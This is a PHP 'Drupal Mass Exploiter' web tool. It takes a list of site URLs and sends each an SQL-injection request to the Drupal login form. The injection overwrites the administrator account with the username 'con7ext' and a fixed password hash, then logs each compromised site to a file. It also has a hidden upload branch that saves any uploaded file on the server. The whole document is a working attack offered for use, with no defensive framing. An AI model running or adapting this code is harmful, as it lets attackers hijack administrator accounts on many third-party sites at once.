<title>Drupal Mass Exploit</title>
<?php
include("../head.php");
?>

<?php
echo "<body>
<center>
<h1 style='color:green;text-shadow:0.5px 0px 0px black;'>Drupal Mass Exploiter</h1>
<form method='post' action=''>
<textarea class='form-control con7' rows='10' cols='10' name='url'>
http://www.site.com
http://www.site2.com</textarea><br><br>
<input type='submit' class='kntd' name='submit' value='Attack!!'>
</form>
<br>
";
$drupal7  = $_GET['drupal7'];
if($drupal7 == 'drupal7'){
$filename = $_FILES['file']['name'];
$filetmp  = $_FILES['file']['tmp_name'];
echo "<form method='POST' enctype='multipart/form-data'>
   <input type='file'name='file' />
   <input type='submit' value='drupal !' />
</form>";
move_uploaded_file($filetmp,$filename);
}
    error_reporting(0);
    if (isset($_POST['submit'])) {
        function exploit($url) {
            $post_data = "name[0;update users set name %3D 'con7ext' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
            $params = array('http' => array('method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded
", 'content' => $post_data));
            $ctx = stream_context_create($params);
            $data = file_get_contents($url . '/user/login/', null, $ctx);
            if ((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) || (stristr($data, 'FcUk Crap') && $data)) {
                $fp = fopen("xpld.txt", 'a+');
                fwrite($fp, "Exploitied  User: con7ext Pass: admin  =====> {$url}/user/login");
                fwrite($fp, "
");
                fwrite($fp, "--------------------------------------------------------------------------------------------------");
                fwrite($fp, "
");
                fclose($fp);
                               
                echo "<font color='gold'><b>Success:<font color='red'> con7ext</font> Pass:<font color='red'> admin</font> =><a href='{$url}/user/login' target=_blank ><font color='green'> {$url}/user/login </font></a></font></b><br>";
            } else {
                echo "<font color='red'><b>Failed => {$url}/user/login</font></b><br>";
            }
        }
               
        $urls = explode("
", $_POST['url']);
        foreach ($urls as $url) {
            $url = @trim($url);
            echo exploit($url);
        }
    }
        ?>
<br><br>
